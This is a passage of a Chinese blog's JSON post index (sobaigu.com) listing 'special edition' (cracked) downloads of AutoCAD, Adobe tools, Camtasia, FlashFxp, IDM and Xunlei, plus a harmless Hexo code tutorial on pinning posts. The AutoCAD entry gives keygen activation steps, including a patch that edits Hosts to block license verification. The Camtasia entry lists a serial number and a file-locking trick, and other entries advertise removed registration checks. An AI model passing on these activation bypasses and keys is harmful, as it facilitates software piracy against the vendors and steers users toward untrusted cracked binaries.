5.0\\bin\\proe.exe (X代表程序解压存放盘），尽量不要有子目录，或中文的子目录！！ 如 x:\\私人目录\\pre4.0\\bin\\proe.exe将无法运行. 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 1vus","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Autodesk AutoCAD-工程制图必备软件","slug":"software-media-AutoCAD","date":"2017-05-26T05:59:11.000Z","updated":"2017-05-26T05:59:11.000Z","comments":true,"path":"software-media-AutoCAD.html","permalink":"https://sobaigu.com/software-media-AutoCAD.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：305.4 m 支持系统：Windows 官方主页： 软件介绍 工程制图必备软件CAD，可用于二维绘图、详细绘制、三维设计，具有良好的操作界面，通过交互菜单或命令行方式便可进行各种操作。它的多文档设计环境，让非专业人员也能学会使用，从而不断提高工作效率。 Auto CAD 2017 精简版特点 精简多余组件，大量用不上的内容 恢复Auto CAD 2014的经典界面 关闭开始选项卡，启动到样板界面 32位版支持在64位Windows中安装 压缩包集成注册机，无需额外下载 注：需安装VC++2008-2015运行库和Net4.5或4.6 Auto CAD 2017 激活步骤 安装后启动软件，输入序列号：800-00000000，产品密钥：001I1，然后勿必断开网络，点激活，这时候出现产品许可激活选项，然后将“申请号”复制下来备用，激活选项界面暂时别关； 这时候找到注册机以管理员身份运行，点击界面上的“Patch”按钮（这里会修改系统Hosts屏蔽联网验证），将上一步复制的“申请号”粘贴到注册机界面“Request”栏，然后点击“Generate”生成激活码，最后将“Activation”栏算出来的激活码复制，注册机这时可以关闭啦； 回到Auto CAD 2017激活选项界面，点击“我具有Autodesk提供的激活码”，将算出的“激活”粘贴，点击下一步，这时会提示祝贺您！Autodesk AutoCAD 2017 已成功激活。 注：如激活失败，删除C:\\ProgramData\\FLEXnet下所有文件后，断网重新激活！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 1vus","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Hexo博客添加文章置顶功能","slug":"hexo-post-stick-to-top","date":"2017-05-23T01:29:43.000Z","updated":"2017-05-23T01:29:43.000Z","comments":true,"path":"hexo-post-stick-to-top.html","permalink":"https://sobaigu.com/hexo-post-stick-to-top.html","excerpt":"原来用的WordPress，直接很方便地管理置顶文章，Hexo只提供了按发布日期的排序，只好网上找了些资料修改。 原理：在Hexo生成首页HTML时，将top值高的文章排在前面，达到置顶功能。 修改Hexo文件夹下的node_modules/hexo-generator-index/lib/generator.js，在生成文章之前进行文章top值排序。","text":"原来用的WordPress，直接很方便地管理置顶文章，Hexo只提供了按发布日期的排序，只好网上找了些资料修改。 原理：在Hexo生成首页HTML时，将top值高的文章排在前面，达到置顶功能。 修改Hexo文件夹下的node_modules/hexo-generator-index/lib/generator.js，在生成文章之前进行文章top值排序。 需添加的代码： 12345678910111213posts.data = posts.data.sort(function(a, b) &#123; if(a.top &amp;&amp; b.top) &#123; // 两篇文章top都有定义 if(a.top == b.top) return b.date - a.date; // 若top值一样则按照文章日期降序排 else return b.top - a.top; // 否则按照top值降序排 &#125; else if(a.top &amp;&amp; !b.top) &#123; // 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233） return -1; &#125; else if(!a.top &amp;&amp; b.top) &#123; return 1; &#125; else return b.date - a.date; // 都没定义按照文章日期降序排&#125;); 其中涉及Javascript的比较函数： 123cmp(var a, var b) &#123; return a - b; // 升序，降序的话就 b - a&#125; 修改完成后，只需要在front-matter中设置需要置顶文章的top值，将会根据top值大小来选择置顶顺序top值越大越靠前。需要注意的是，这个文件不是主题的一部分，也不是Git管理的，备份的时候比较容易忽略。 以下是最终的generator.js内容 12345678910111213141516171819202122232425262728&#x27;use strict&#x27;;var pagination = require(&#x27;hexo-pagination&#x27;);module.exports = function(locals)&#123; var config = this.config; var posts = locals.posts; posts.data = posts.data.sort(function(a, b) &#123; if(a.top &amp;&amp; b.top) &#123; if(a.top == b.top) return b.date - a.date; else return b.top - a.top; &#125; else if(a.top &amp;&amp; !b.top) &#123; return -1; &#125; else if(!a.top &amp;&amp; b.top) &#123; return 1; &#125; else return b.date - a.date; &#125;); var paginationDir = config.pagination_dir || &#x27;page&#x27;; return pagination(&#x27;&#x27;, posts, &#123; perPage: config.index_generator.per_page, layout: [&#x27;index&#x27;, &#x27;archive&#x27;], format: paginationDir + &#x27;/%d/&#x27;, data: &#123; __index: true &#125; &#125;);&#125;; 参考文档 解决Hexo置顶问题","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"Adobe Fireworks-图片切片，制作GIF动画","slug":"software-media-adobe-Fireworks","date":"2017-05-19T05:59:11.000Z","updated":"2017-05-19T05:59:11.000Z","comments":true,"path":"software-media-adobe-Fireworks.html","permalink":"https://sobaigu.com/software-media-adobe-Fireworks.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：92.2 m 支持系统：Windows/OSX 官方主页：www.adobe.com/products/catalog.html 软件介绍 Fireworks是Adobe推出的一款网页作图软件，软件可以加速 Web 设计与开发， 是一款创建与优化 Web 图像和快速构建网站与 Web 界面原型的理想工具。Fireworks 不仅具备编辑矢量图形与位图图像的灵活性， 还提供了一个预先构建资源的公用库， 并可与 Adobe Photoshop、Adobe Illustrator、Adobe Dreamweaver和 Adobe Flash软件省时集成。 在 Fireworks中将设计迅速转变为模型， 或利用来自Illustrator、Photoshop和Flash的其它资源。 然后直接置入Dreamweaver中轻松地进行开发与部署. 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 o63i","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Adobe Dreamweaver-傻瓜式设计和开发新式响应式网站","slug":"software-media-adobe-Dreamweaver","date":"2017-05-16T05:59:11.000Z","updated":"2017-05-16T05:59:11.000Z","comments":true,"path":"software-media-adobe-Dreamweaver.html","permalink":"https://sobaigu.com/software-media-adobe-Dreamweaver.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：92.2 m 支持系统：Windows/OSX 官方主页：www.adobe.com/products/catalog.html 软件介绍 Adobe Dreamweaver，简称“DW”，中文名称 “梦想编织者”，是美国MACROMEDIA公司开发的集网页制作和管理网站于一身的所见即所得网页编辑器。 DW是第一套针对专业网页设计师特别发展的视觉化网页开发工具，利用它可以轻而易举地制作出跨越平台限制和跨越浏览器限制的充满动感的网页。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 o63i","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Adobe Illustrator-矢量图形处理工具","slug":"software-media-adobe-Illustrator","date":"2017-05-13T05:59:11.000Z","updated":"2017-05-13T05:59:11.000Z","comments":true,"path":"software-media-adobe-Illustrator.html","permalink":"https://sobaigu.com/software-media-adobe-Illustrator.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：139.1 m 支持系统：Windows/OSX 官方主页：www.adobe.com/products/catalog.html 软件介绍 Adobe illustrator是一种应用于出版、多媒体和在线图像的工业标准矢量插画的软件，作为一款非常好的矢量图形处理工具，Adobe Illustrator广泛应用于印刷出版、海报书籍排版、专业插画、多媒体图像处理和互联网页面的制作等，也可以为线稿提供较高的精度和控制，适合生产任何小型设计到大型的复杂项目。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 1vus","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Adobe Photoshop Lightroom-数码图像后期制作软件","slug":"software-media-adobe-Lightroom","date":"2017-05-08T05:59:11.000Z","updated":"2017-05-08T05:59:11.000Z","comments":true,"path":"software-media-adobe-Lightroom.html","permalink":"https://sobaigu.com/software-media-adobe-Lightroom.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：356.2 m 支持系统：Windows/OSX 官方主页：www.adobe.com/products/catalog.html 软件介绍 Lightroom是一款重要的后期制作工具，面向数码摄影、图形设计等专业人士和高端用户，支持各种RAW图像，主要用于数码相片的浏览、编辑、整理、打印等。Adobe Photoshop Lightroom 新版本在功能上较原先有了较多的改进，主要增强了修复画笔功能以及全新的垂直工具（Upright tool），而V5版本开始不再支持Windows XP系统。 Lightroom与Photoshop有很多相通之处，但定位不同，不会取而代之，并且Photoshop上的很多功能，如选择工具、照片瑕疵修正工具、多文件合成工具、文字工具和滤镜等Lightroom并没有提供。 同时，Windows版的Lightroom也失去了Mac OS X版的一些功能，如幻灯片背景音乐、照相机和存储卡监测功能、HTML格式幻灯片创建工具等。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 4cot","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Adobe Photoshop-全球最强大的图像处理软件","slug":"software-media-adobe-photoshop","date":"2017-05-03T05:32:21.000Z","updated":"2017-05-03T05:32:21.000Z","comments":true,"path":"software-media-adobe-photoshop.html","permalink":"https://sobaigu.com/software-media-adobe-photoshop.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：329.3 m 支持系统：Windows/OSX 官方主页：www.adobe.com/products/catalog.html 软件介绍 Adobe Photoshop - 全球最大的图像处理软件！传说中的“PS”，是一个由Adobe开发和发行的图像处理软件。主要处理以像素所构成的数字图像，使用其众多的编修与绘图工具，可以有效地进行图片编辑工作。PS有很多功能，在图像、图形、文字、视频、出版等各方面都有涉及。 Adobe Photoshop CC 具有更多更高效的性能，新功能包含：新的模糊效果和聚焦区域选定等工具、相机防抖动功能、Camera RAW功能改进、图像提升采样、属性面板改进、Behance集成、同步设置及其它一些同步等功能。Adobe Photoshop CC 依然是数字图象处理和编辑的业界标准，提供广泛的专业级润饰工具套件，并集成了专为激发灵感而设计的强大编辑功能。 下载目录中包含一些经典版本，如无特别需要，推荐下载体积小轻巧足够用的：PhotoShop CS2或CS3版本 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 4cot","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Camtasia Studio-视频制作工具","slug":"software-media-CamtasiaStudio","date":"2017-05-01T05:07:05.000Z","updated":"2017-05-01T05:07:05.000Z","comments":true,"path":"software-media-CamtasiaStudio.html","permalink":"https://sobaigu.com/software-media-CamtasiaStudio.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：29.3 m 支持系统：Windows 官方主页：techsmith.com 软件介绍 Camtasia是一款专门捕捉屏幕影音的软件。它能在任何颜色模式下记录屏幕动作，包括影像、音效、鼠标移动的轨迹，解说声音等等，另外，具有及时播放和编辑压缩的功能，可对视频片段进行剪接、添加转场效果。它输出的文件格式很多，包括Flash、AVI、GIF、MOV、RM动画等常见格式，用起来极其顺手。 同时它还是一款视频编辑软件，可以将多种格式的图像,视频剪辑连接成电影，输出格式支持GIF动画、AVI、RM、QuickTime电影（QucikTime 4.0以上）等，并可将电影文件打包成 EXE文件，在没有播放器的机器上也可以进行播放，同时还附带一个功能强大的屏幕动画抓取工具，内置一个简单的媒体播放器。 激活序列号 用户名：Admin 序列号：ZLACM-2YZ4K-D6CCA-CCC5M-L88CE 注意事项 安装时填写序列号，用户名随便写； 装完不要启动软件，找到下面文件设置只读！ WinXP：%ProgramData%\\TechSmith\\Camtasia Studio 8\\RegInfo.ini Win7：%AllUsersProfile%\\Application Data\\TechSmith\\Camtasia Studio 8\\RegInfo.ini PS：卸载软件请勿必将该文件只读取消，否则卸载程序时可能无法成功！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 3lmz","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"GifCam-屏幕GIF动画录制","slug":"software-media-GifCam","date":"2017-04-29T04:04:15.000Z","updated":"2017-04-29T04:04:15.000Z","comments":true,"path":"software-media-GifCam.html","permalink":"https://sobaigu.com/software-media-GifCam.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小：0.6 m 支持系统：Windows 官方主页： 软件介绍 GifCam是款集录制与剪辑为一体的屏幕GIF动画制作工具，录制后的动画可以逐帧编辑，具有精确录制、可剪辑等特色，录制过程可调整窗口大小/位置，可以暂停/继续，录制范围内无变化则不增加新帧而只增加延时，有效较小文件尺寸，可手动录制单帧。编辑状态可查看每一帧，下可以删除帧、增加当前帧延时。 关于汉化-by roustar31 基于官方原版汉化制作,绿色单文件 不加壳反应速度快，方便自己Diy 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 3lmz","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"FSCapture-屏幕录像截图必备软件","slug":"software-media-FSCapture","date":"2017-04-25T03:53:05.000Z","updated":"2017-04-25T03:53:05.000Z","comments":true,"path":"software-media-FSCapture.html","permalink":"https://sobaigu.com/software-media-FSCapture.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：2.6 m 支持系统：Windows 官方主页：www.faststone.org/FSCaptureDetail.htm 软件介绍 FSCapture（FastStone Screen Capture）抓屏工具集图像捕捉、浏览编辑、视频录制等功能于一身！堪称截图神软，小巧和强悍，使用过程易上手，很流畅，各种设置，使截图有了超越其本身的创造性，不但具有常规截图等功能，更有从扫描器获取图像，和将图像转换为 PDF 文档等功能。特别是屏幕录像功能，质量堪比专业屏幕录像软件。 该工具新版本已经支持固定区域截图和重复上次截取功能，也增强了滚动窗口截图性能，支持到各大浏览器的最新版本。除此之外，FastStone Capture 也提供了实用小工具，如屏幕录像机、屏幕放大镜、屏幕取色器、屏幕标尺、屏幕十字线等。屏幕录像机功能可以录制屏幕动作，将窗口/对象、矩形区域或全屏区域的屏幕录制为高清晰 WMV 视频。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 3lmz","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Windows程序微软运行库合集","slug":"software-Windows-Runtime","date":"2017-04-20T03:41:18.000Z","updated":"2017-04-22T03:41:18.000Z","comments":true,"path":"software-Windows-Runtime.html","permalink":"https://sobaigu.com/software-Windows-Runtime.html","excerpt":"","text":"基本信息 程序类型：安装版 界面语言：中文英文 文件大小： 32.9 m 支持系统：Windows 官方主页：www.microsoft.com 软件介绍 系统运行库就是支持大部分软件运行的基础！Windows微软常用运行库合集，这些运行库都是采用Microsoft Visual Studio 20XX编写的软件必须使用的公用DLL运行库，相当于程序的字典文件，某些网上和论坛的部分精简软件没有附带这些公用DLL，所以安装这些运行库是系统安装后第一件要做的事情； 有时候启动某软件会提示下面这样的就是缺少依赖支持库: 由于应用程序的配置不正确，应用程序未能启动，重新安装应用程序可能会纠正这个问题 某些程序在64位系统下运行任然需要32位的运行库，因为程序是基于32位Visual Studio开发的,所以安装的时候32位依赖库也需要一并安装. 本集合包含下列组件： Visual Basic Virtual Machine(5.1) Visual Basic Virtual Machine (6.0) Microsoft C Runtime Library(7.0) Microsoft C Runtime Library(7.10) Microsoft Visual C++ 2005 SP1(8.0.61187) Microsoft Visual C++ 2008 SP1(9.0.30729.7523) Microsoft Visual C++ 2010 SP1(10.0.40219.473) Microsoft Visual C++ 2012 up4(11.0.61135) Microsoft Visual C++ 2013(12.0.40660) Microsoft Visual C++ 2015(14.0.24516) Microsoft Universal C Runtime (10.0.10586.9) VS 2010 Tools For Office Runtime(10.0.60830) Windows 微软常用运行库合集 by roustar31 支持WinXP/2003/Vista/Win7/Win8/Win8.1/Win10（32+64位） 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 v4w9","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"FlashFxp – 老牌FTP/FXP传输必备软件","slug":"software-sync-flashfxp","date":"2017-04-20T03:32:04.000Z","updated":"2017-04-20T03:32:04.000Z","comments":true,"path":"software-sync-flashfxp.html","permalink":"https://sobaigu.com/software-sync-flashfxp.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：2.8 m 支持系统：Windows 官方主页：flashfxp.com 软件介绍 FlashFxp – 老牌FTP/FXP传输必备软件，功能强大最常用的FTP，FXP，FTPS，SFTP上传下载必备工具，它可以快速部署和维护用户网站。支持上传和下载站点文件，例如文档，图片，视频，音乐等等。同样也支持转移和备份本地和远程的文件，以及FXP服务器之间的传输和转移。支持多语言，包括简体中文在内。 关于特别版 基于官方便携安装版破解打包，去后续检测更新提示 集成密钥文件，启动即为已授权版；禁止联网验证注册信息，后续不反弹 补充汉化翻译了官方简体中文语言，默认启动为中文，删多语言、帮助文档 4.x：@烈火作品，完善翻译，免KEY永久使用！点输入代码按钮可自动注册 常见问题 连接linux的服务器，简体中文乱码？ 请在站点管理器里选对应的站点，切换到连接标签，将字符编码由自动检测改为UTF-8 导入以往3.X/4.X的站点后，中文站点名称乱码？ 请用编辑器打开site.dat，转换编码为UTF-8保存，再导入即可正常显示中文名称站点 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 shp1","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"BitTorrent Sync-不仅是同步利器，而且是分布式网盘","slug":"software-sync-BitTorrent-Sync","date":"2017-04-16T02:42:22.000Z","updated":"2017-04-16T02:42:22.000Z","comments":true,"path":"software-sync-BitTorrent-Sync.html","permalink":"https://sobaigu.com/software-sync-BitTorrent-Sync.html","excerpt":"","text":"基本信息 程序类型：安装版 界面语言：中文英文 文件大小：14.4 m 支持系统：Windows/Linux/MacOS/Android/iOS 官方主页：www.resilio.com/platforms/desktop/ 软件介绍 BitTorrent Sync是由BitTorrent公司开发的专有的对等网络数据同步工具，可在Windows、OS X、Linux、Android、iOS上使用。其可在局域网、互联网上通过安全的、分布式的P2P技术在不同设备之间同步文件。 尽管BitTorrent Sync开发者不认为这是传统文件同步工具（如Dropbox）的竞争者或替代品，但已有人开始注意到这个与众不同的同步工具了。这主要是由于BitTorrent Sync没有常见的文件同步工具中所含有的问题，如文件存储容量限制、私有/安全性、价格因素、同步速度因素。 优势 BitTorrent Sync最大的优势在于其不需要第三方服务器，几乎不受存储空间和流量限制。由于BitTorrent Sync是一款采用 BitTorrent 协议的P2P同步工具，传输速度基本上只受用户网络带宽的制约，它可以支持多人同时同步，而且，越多人对文件夹进行同步，则同步速度越快。它支持多平台，可以通过密钥进行文件分享。 缺点 由于BitTorrent Sync的数据不在云端，而是存储在本地。所以拥有文件的电脑需要保持在线，才能同步到其他电脑去。而且由于采用类似 BT 的协议，因此在某些禁用 BT 下载的场景中可能会受到影响。 同类软件 Syncthing-开源免费数据同步软件 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 shp1","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"IDM(Internet Download Manager)-国外流行下载工具","slug":"software-sync-IDM","date":"2017-04-11T02:32:19.000Z","updated":"2017-04-11T02:32:19.000Z","comments":true,"path":"software-sync-IDM.html","permalink":"https://sobaigu.com/software-sync-IDM.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文英文 文件大小：3.8 m 支持系统：Windows 官方主页：www.internetdownloadmanager.com 软件介绍 国外流行下载工具Internet Download Manager现已小幅更新至v6.27.2，新版取消了在Win10下载对话框边框！作为必备最佳网络下载利器，界面风格始终一样。 IDM绿色特别版由 ZD423 专注优化，无需序列号，免注册即为授权版、完美简体中文汉化，无多余菜单弹窗！IDM下载器是国内外优秀下载工具，支持IE, Firefox, Chrome等所有浏览器，兼容所有Windows平台。最具特色功能如续传功能，支持恢复因为断线、网络问题、计算机宕机等故障导致中断的下载任务。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 shp1","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"迅雷极速版-绿色纯净版本","slug":"software-sync-thunder","date":"2017-04-07T02:19:36.000Z","updated":"2017-04-13T02:19:36.000Z","comments":true,"path":"software-sync-thunder.html","permalink":"https://sobaigu.com/software-sync-thunder.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：11.2 m 支持系统：Windows 官方主页：www.xunlei.com 软件介绍 匠人心作，简约而不简单！无广告，无插件，清爽简约，启动超快，下载更快…回归极简，一切只为下载服务！去掉广告，还你清爽迅雷去除游戏及新闻弹窗广告追求极简之美；抛弃其它产品捆绑安装去除迅雷看看及游戏插件无插件，启动更快；回归下载本质优化产品架构及服务专注下载，所以更快。 关于此绿色纯净版： 支持自定义边下边播功能(详情请看绿化) 精简多余文件、合并Tp目录文件到Program； 禁止云端推送下载插件，可设置为默认下载器； 去XLLiveUD.exe、XLServicePlatform.exe效验； 去附近功能、去主面板界面VIP和积分中心选项； 适当破解宽度限制、去高速通道、离线下载、边下边播左侧文字广告； 去主面板搜索栏、消息中心、应用按钮，去掉积分中心下面图片广告； 去主菜单开机自动启动、意见反馈、检查更新、帮助中心、用户论坛选项； 去设置选项：消息相关设置、Windows库中建立迅雷下载、默认使用迅雷看看打开视频文件； 以下的功能自选精简： 附近功能：Thunder\\Xar\\ThunderApp\\XLCloud.xar （默认已精简） 远程下载功能：Thunder\\Xar\\ThunderApp\\XLVipBoxPage.xar， Program\\XLVipBox.dll BT种子文件无法关联？高级设置-BT设置-启动时关联BT种子..勾掉-应用..再勾上…点确定即可！ 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 